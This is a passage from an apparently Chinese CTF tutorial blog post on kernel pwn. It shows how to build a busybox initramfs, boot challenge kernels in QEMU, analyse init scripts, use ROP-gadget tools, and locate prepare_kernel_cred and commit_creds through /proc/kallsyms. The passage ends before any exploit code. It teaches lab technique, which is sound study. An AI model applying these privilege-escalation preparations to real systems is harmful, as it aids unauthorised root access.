class="line"><span class="string">#!/bin/sh</span></span><br><span class="line"><span class="string">mount -t proc none /proc</span></span><br><span class="line"><span class="string">mount -t sysfs none /sys</span></span><br><span class="line"><span class="string">mount -t devtmpfs none /dev</span></span><br><span class="line"><span class="string">exec /bin/sh</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"><span class="built_in">chmod</span> +x init</span><br><span class="line"></span><br><span class="line">find . | cpio -o --format=newc | gzip &gt; ../initramfs.cpio.gz</span><br></pre></td></tr></table></figure></div>
<p>执行完以上命令后，我们就得到了<code>initramfs.cpio.gz</code>这样一个文件系统，然后我们可以用qemu虚拟机起虚拟环境。先写一个sh脚本。其中用到了qemu虚拟机，所以我们要先进行安装。</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install qemu-system-x86</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#run.sh</span></span><br><span class="line"><span class="built_in">exec</span> qemu-system-x86_64 \</span><br><span class="line">    -m 256 \</span><br><span class="line">    -nographic \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 earlyprintk=serial debug panic=0&quot;</span> \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -kernel <span class="string">&quot;/mnt/e/ctf/kernel/linux-5.15.153/arch/x86/boot/bzImage&quot;</span> \</span><br><span class="line">    -initrd <span class="string">&quot;./initramfs.cpio&quot;</span></span><br></pre></td></tr></table></figure></div>
<p>然而一跑直接报错，执行不了/init。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250114004241555.png"
                      class=""
                >
<p>这里搞了半天，甚至拿正常题目给的cpio文件系统能够进入内核正确执行。最后发现问题所在，是因为我们用系统自带的包管理器下载的busybox是动态编译的，所以在我们虚拟的环境里，没有配置动态链接库，也就执行不了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250114145451508.png"
                      class=""
                >
<p>那么我们可以从<a class="link" 
 target="_blank" rel="noopener" href="https://busybox.net/" >官网<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>下载源码，然后自己指定静态编译。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make menuconfig</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-01-14-000023.png"
                      class=""
                >
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make -j3</span><br><span class="line">make install</span><br></pre></td></tr></table></figure></div>
<p>然后就能在项目根目录获取到一个静态编译的busybox，把这个busybox扔到我们待打包成文件系统的bin目录下。之后就能正常运行了。有了busybox，我们就可以把一些常用指令都扔去。这里可以写个脚本，把busybox支持的所有指令都给放到bin目录下。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> initramfs/bin</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> cmd <span class="keyword">in</span> $(busybox --list); <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">ln</span> -sf busybox <span class="variable">$cmd</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></div>
<p>然后对文件系统进行打包，解压。最后run一下看看能不能正常启动。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find . | cpio -o --format=newc | gzip &gt; ../initramfs.cpio.gz</span><br><span class="line"><span class="built_in">cd</span> ../</span><br><span class="line">gunzip initramfs.cpio.gz</span><br><span class="line">cpio -idmv &lt; initramfs.cpio</span><br><span class="line">./run.sh</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250114151349527.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250114151546880.png"
                      class=""
                >
<p>现在已经能启动了，不过tty出现了问题，但不影响我们对内核的模块进行测试。然后我们就可以把之前编译好的<strong>myko.ko</strong>扔到虚拟的文件系统里，重新打包一次并运行。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> myko.ko ./initramfs/myko.ko</span><br><span class="line"><span class="built_in">cd</span> initramfs</span><br><span class="line">find . | cpio -o --format=newc  &gt; ../initramfs.cpio</span><br><span class="line"><span class="built_in">cd</span> ../</span><br><span class="line">cpio -idmv &lt; initramfs.cpio</span><br><span class="line">./run.sh</span><br></pre></td></tr></table></figure></div>
<p>然后我们就可以装载模块，出现Hello，world！说明正确导入了内核的扩展模块。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250114153803147.png"
                      class=""
                >
<h5 id="题目提供环境">题目提供环境</h5>
<p>一般kernel pwn题会给出以下几种类型的文件。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xxx.sh		<span class="comment">//启动脚本</span></span><br><span class="line">bzImage		<span class="comment">//内核脚本</span></span><br><span class="line">xxx.cpio	<span class="comment">//文件系统</span></span><br><span class="line">xxx.ko		<span class="comment">//内核模块文件，相当于用户模式的.so动态链接库</span></span><br></pre></td></tr></table></figure></div>
<p><strong>内核镜像分类</strong></p>
<ul>
<li>vmlinux：原始内核文件</li>
</ul>
<p>在当前目录下提取到 vmlinux ，为编译出来的原始内核文件。</p>
<ul>
<li>bzImage：压缩内核镜像</li>
</ul>
<p>在当前目录下的 arch/x86/boot/ 目录下提取到 bzImage
，为压缩后的内核文件，适用于大内核。</p>
<ul>
<li>zImage &amp;&amp; bzImage</li>
</ul>
<p>zImage 是 vmlinux 经过gzip压缩后的文件。bzImage 中的 bz 表示“big
zImage”。bzImage 不是用 bzip2 压缩，而是要偏移到一个位置，使用 gzip
压缩。两者的不同之处在于，zImage 解压缩内核到低端内存(第一个
640K)，bzImage 解压缩内核到高端内存(1M 以上)。如果内核比较小，那么采用
zImage 或 bzImage 都行，如果比较大应该用 bzImage 。</p>
<p>其中我们来看看<code>xxx.sh</code>分析一下启动的过程。</p>
<p>如在<strong>DSBCTF-EasyKernel</strong>这个题中，其提供了3个文件。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250111221325011.png"
                      class=""
                >
<p>run.sh中的内容如下：</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> qemu-system-x86_64 \</span><br><span class="line">    -cpu kvm64 \</span><br><span class="line">    -m 256 \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel <span class="string">&quot;bzImage&quot;</span> \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 panic=-1 pti=off kaslr quiet&quot;</span> \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd <span class="string">&quot;./rootfs.cpio&quot;</span> \</span><br><span class="line">    -net user \</span><br><span class="line">    -net nic</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p><strong>-cpu kvm64</strong></p>
<p>指定虚拟机的 CPU 类型为 <code>kvm64</code>。kvm64是 QEMU
提供的一个优化 CPU 类型，它专为 KVM 提供虚拟化支持。如果运行环境支持
KVM，则可以获得硬件加速。此选项对需要模拟 CPU 特性的程序（如针对 CPU
指令的漏洞开发）特别有用。</p>
<p><strong>-m 256</strong></p>
<p>设置虚拟机内存大小为 <strong>256
MB</strong>。可以根据需要调整这个数值来分配更多或更少的内存。</p>
<p><strong>-nographic</strong></p>
<p>让虚拟机运行在无图形模式（纯终端模式）。禁用图形输出窗口（例如 VGA
显示），仅使用标准输入输出（例如通过 <code>ttyS0</code> 访问）。</p>
<p><strong>-kernel "bzImage"</strong></p>
<p>指定要加载的 Linux 内核文件，通常是已编译好的 <code>bzImage</code>
文件。<strong><code>bzImage</code></strong> 是 Linux
内核的可引导压缩映像。</p>
<p><strong>-append "console=ttyS0 panic=-1 pti=off kaslr
quiet"</strong></p>
<p>向内核传递启动参数：</p>
<ol type="1">
<li><code>console=ttyS0</code>
<ul>
<li>将内核的输出和输入重定向到串行端口
<code>ttyS0</code>（第一个串行设备）。</li>
<li>这通常与 <code>-nographic</code> 一起使用。</li>
</ul></li>
<li><code>panic=-1</code>
<ul>
<li>如果内核遇到致命错误（panic），虚拟机会无限期地等待，不会自动重启。</li>
</ul></li>
<li><code>pti=off</code>
<ul>
<li>关闭 Page Table Isolation（PTI）。PTI 是一个用于缓解 Meltdown
漏洞的安全措施，但会影响性能。</li>
</ul></li>
<li><code>kaslr</code>
<ul>
<li>随机化内核地址空间布局（Kernel Address Space Layout
Randomization）。</li>
<li>没有 <code>off</code>
说明功能是启用状态；在调试中可以关闭此功能。</li>
</ul></li>
<li><code>quiet</code>
<ul>
<li>启动时减少输出的日志信息，显示更简洁的控制台内容。</li>
</ul></li>
</ol>
<p><strong>-monitor /dev/null</strong></p>
<p>将 QEMU 的管理控制台（Monitor）的输入输出重定向到
<code>/dev/null</code>。QEMU
默认提供一个监控终端，用于控制虚拟机，这里通过设置为
<code>/dev/null</code> 禁用了该功能。</p>
<p><strong>-initrd "./rootfs.cpio"</strong></p>
<p>指定初始 RAM 磁盘（Initial RAM Disk），用 <code>./rootfs.cpio</code>
文件作为虚拟机的初始根文件系统。<strong><code>rootfs.cpio</code></strong>
是一个打包的 CPIO
格式文件系统，虚拟机启动时会加载并挂载它为根文件系统。</p>
<p><strong>-net user</strong></p>
<p>启用用户模式网络（User Networking）。提供简单的 NAT
网络环境，不需要额外配置主机的网络。</p>
<p><strong>-net nic</strong></p>
<p>创建一个虚拟网络接口卡（NIC，Network Interface
Card），用作虚拟机的网络设备。</p>
<p>然后我们要对文件系统进行解压，之后就能在当前目录下得到整个文件系统结构。</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cpio -idmv &lt; rootfs.cpio</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250111224302985.png"
                      class=""
                >
<p>之后我们直接<code>./run.sh</code>跑一下，发现已经能够运行起来了，但是由于是本地的环境，所以flag还要我们自己手动设置一下。可以在root目录下自己手动创建一个ctfshow_flag，然后再打包回去文件系统。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250111224440566.png"
                      class=""
                >
<p>我们再仔细看看刚刚解压出的在根目录下的内容。其中有ctfshow.ko，也就是我们重点分析的漏洞存在的扩展模块。还有init文件，该文件是linux启动时的初始化文件，包含一些重要信息，而且可以修改该文件的一些内容来方便调试。我们来看看这道题的init里是什么内容。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">chown</span> -R 0:0 /                                                                                  </span><br><span class="line">mount -t tmpfs tmpfs /tmp</span><br><span class="line"><span class="built_in">export</span> PATH=/bin</span><br><span class="line"><span class="built_in">export</span> PATH=/sbin:<span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line">[ -d /dev ] || <span class="built_in">mkdir</span> -m 0755 /dev</span><br><span class="line">[ -d /sys ] || <span class="built_in">mkdir</span> /sys</span><br><span class="line">[ -d /proc ] || <span class="built_in">mkdir</span> /proc</span><br><span class="line">[ -d /tmp ] || <span class="built_in">mkdir</span> /tmp</span><br><span class="line">[ -d /run ] || <span class="built_in">mkdir</span> /run</span><br><span class="line">[ -d /etc ] || <span class="built_in">mkdir</span> /etc</span><br><span class="line">[ -d /home ] || <span class="built_in">mkdir</span> /home</span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> 644 /etc/passwd</span><br><span class="line"><span class="built_in">chmod</span> 644 /etc/group</span><br><span class="line"><span class="built_in">chown</span> -R root:root /</span><br><span class="line"><span class="built_in">chown</span> 0:0 /root/ctfshow_flag</span><br><span class="line"><span class="built_in">chmod</span> 400 /root/ctfshow_flag</span><br><span class="line"><span class="built_in">chmod</span> 777 /tmp</span><br><span class="line"></span><br><span class="line"><span class="built_in">chown</span> ctfshow:ctfshow -R /home/ctfshow</span><br><span class="line"><span class="built_in">chmod</span> 777 /home/ctfshow</span><br><span class="line"><span class="built_in">chmod</span> 755 /dev</span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> -p /var/lock</span><br><span class="line">mount -t sysfs -o nodev,noexec,nosuid sysfs /sys</span><br><span class="line">mount -t proc -o nodev,nosuid proc /proc</span><br><span class="line"><span class="built_in">ln</span> -sf /proc/mounts /etc/mtab</span><br><span class="line">mount -t devtmpfs -o nosuid,mode=0755 udev /dev</span><br><span class="line"><span class="built_in">mkdir</span> -p /dev/pts</span><br><span class="line">mount -t devpts -o noexec,nosuid,gid=5,mode=0620 devpts /dev/pts || <span class="literal">true</span></span><br><span class="line">mount -t tmpfs -o <span class="string">&quot;noexec,nosuid,size=10%,mode=0755&quot;</span> tmpfs /run</span><br><span class="line"></span><br><span class="line">insmod ctfshow.ko</span><br><span class="line"><span class="built_in">chmod</span> o+rw /dev/kqueue</span><br><span class="line"><span class="built_in">chmod</span> u+s /bin/ping</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/perf_event_paranoid</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">exec</span> 0&lt;/dev/console) 2&gt;/dev/null; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">exec</span> 0&lt;/dev/console</span><br><span class="line">    <span class="built_in">exec</span> 1&gt;/dev/console</span><br><span class="line">    <span class="built_in">exec</span> 2&gt;/dev/console</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> /sbin/init <span class="string">&quot;<span class="variable">$@</span>&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>从该文件中我们能看出很多重要信息：</p>
<ul>
<li>flag的权限被设置为了只有root权限可读。</li>
<li>启用了kptr_restrict，perf_event_paranoid，dmesg_restrict的内核保护机制。</li>
<li>对 <code>/bin/ping</code> 设置了 SUID
属性，普通用户运行它时会临时具有 root
权限。如果该二进制文件可以被替换或加载动态链接库，则可能借此实现提权。</li>
<li>存在<code>/dev/kqueue</code>这个设备驱动模块，可能是漏洞利用的关键。</li>
</ul>
<h4 id="工具安装">工具安装</h4>
<h5 id="vmlinux-to-elf">vmlinux-to-elf</h5>
<p>此工具允许从 vmlinux/vmlinuz/bzImage/zImage 内核映像获取完全可分析的
.ELF 文件，其中包含恢复的函数和变量符号。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install python3-pip</span><br><span class="line"><span class="built_in">sudo</span> pip3 install --upgrade lz4 zstandard git+https://github.com/clubby789/python-lzo@b4e39df</span><br><span class="line"><span class="built_in">sudo</span> pip3 install --upgrade git+https://github.com/marin-m/vmlinux-to-elf</span><br></pre></td></tr></table></figure></div>
<p><strong>使用方式</strong></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmlinux-to-elf &lt;input_kernel.bin&gt; &lt;output_kernel.elf&gt;</span><br></pre></td></tr></table></figure></div>
<h5 id="ropper">ropper</h5>
<p>用于获取gadget，比ropgadget快。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#安装</span></span><br><span class="line">pip3 install ropper</span><br></pre></td></tr></table></figure></div>
<p><strong>使用方式</strong></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用，将结果存在g1文件里</span></span><br><span class="line">ropper --file ./vmlinux --nocolor &gt; g1</span><br></pre></td></tr></table></figure></div>
<h5 id="extract-vmlinux">extract-vmlinux</h5>
<p>能够从bzImage等提取出vmlinux。这个脚本在我们编译出的内核源码的scripts目录下。</p>
<p><strong>使用方式</strong></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./extract-vmlinux ./bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure></div>
<h4 id="gdb调试">gdb调试</h4>
<p>获取内核特定符号地址</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep prepare_kernel_cred  /proc/kallsyms</span><br><span class="line">grep commit_creds  /proc/kallsyms</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250114201804986.png"
                      class=""
                >
<p>获取驱动加载基地址，又有不同的方式。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/modules</span><br><span class="line">grep module_name /proc/modules</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250114202256392.png"
                      class=""
                >
<p>首先需要对 run.sh 做如下修改：</p>
<ul>
<li>添加 nokaslr 关闭地址随机化（不一定需要）。</li>
<li>添加 -s，因为 qemu
其实提供了调试内核的接口，我们可以在启动参数中添加 -gdb dev
来启动调试服务。最常见的操作为在一个端口监听一个 tcp 连接。 QEMU
同时提供了一个简写的方式 -s，表示 -gdb tcp::1234，即在 1234 端口开启一个
gdbserver。</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> qemu-system-x86_64 \</span><br><span class="line">    -cpu kvm64 \</span><br><span class="line">    -m 256 \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel <span class="string">&quot;bzImage&quot;</span> \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 panic=-1 pti=off nokaslr quiet&quot;</span> \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd <span class="string">&quot;./rootfs.cpio&quot;</span> \</span><br><span class="line">    -net user \</span><br><span class="line">    -net nic    \</span><br><span class="line">    -s</span><br><span class="line">  </span><br></pre></td></tr></table></figure></div>
<p>然后我们就可以在启动qemu后，然后gdb远程连接到gdbserver进行调试。<code>-q</code>指定安静模式，<code>-ex</code>为启动gdb后立即执行指令。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb -q -ex <span class="string">&quot;target remote localhost:1234&quot;</span> </span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250114203048016.png"
                      class=""
                >
<p>在启动内核后，我们可以使用 <code>add-symbol-file</code>
来添加符号信息，比如</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add-symbol-file vmlinux addr_of_vmlinux </span><br><span class="line">add-symbol-file ./your_module.ko addr_of_ko</span><br></pre></td></tr></table></figure></div>
<h4 id="基础利用手法">基础利用手法</h4>
<h5 id="kernel-rop">kernel ROP</h5>
<h4 id="题目复现">题目复现</h4>
<h5 id="强网杯-2018---core">强网杯 2018 - core</h5>
<p>首先我们解压文件系统，这里发现给出的<strong>core.cpio</strong>，但其类型是gzip压缩，所以我们要先用gunzip解压一下。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117004743103.png"
                      class=""
                >
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mv</span> core.cpio ./core.cpio.gz</span><br><span class="line">gunzip core.cpio.gz</span><br><span class="line">cpio -idmv &lt; core.cpio</span><br></pre></td></tr></table></figure></div>
<p>题目给出了<strong>gen_cpio.sh</strong>，这个是用来重新打包文件系统的，以便我们修改init。其会把当前目录下所有内容打包，压缩并输出到我们命令行提供第一个参数所指定的目录处。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#gen_cpio.sh</span></span><br><span class="line">find . -print0 \</span><br><span class="line">| cpio --null -ov --format=newc \</span><br><span class="line">| gzip -9 &gt; <span class="variable">$1</span></span><br></pre></td></tr></table></figure></div>
<p>start.sh以及init文件的内容如下：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#start.sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 64M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</span> \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,<span class="built_in">id</span>=t0, -device e1000,netdev=t0,<span class="built_in">id</span>=nic0 \</span><br><span class="line">-nographic  \</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------#</span></span><br><span class="line"><span class="comment">#init</span></span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line"><span class="built_in">mkdir</span> -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/ptmx</span><br><span class="line"><span class="built_in">cat</span> /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2 </span><br><span class="line">insmod /core.ko</span><br><span class="line"></span><br><span class="line">poweroff -d 120 -f &amp;</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;sh end!\n&#x27;</span></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>然后我们尝试启动内核，但是会卡在启动界面，经过调试，我们把start.sh中的内存指派64M改为128M，就能够正常进入内核环境。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117005845709.png"
                      class=""
                >
<p>然后我们仔细看看init里面的内容，发现存在2分钟定时关闭，而且启动的shell是普通用户的shell(uid为1000)，并且禁用了dmesg的内核日志查看以及直接<code>cat /proc/kallsyms</code>获取符号位置。但这道题的init中还是贴心的先把<code>/proc/kallsyms</code>迁移到了<code>/tmp/kallsyms</code>，那么其实我们还是能查看符号的偏移位置。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117010622321.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117010705905.png"
                      class=""
                >
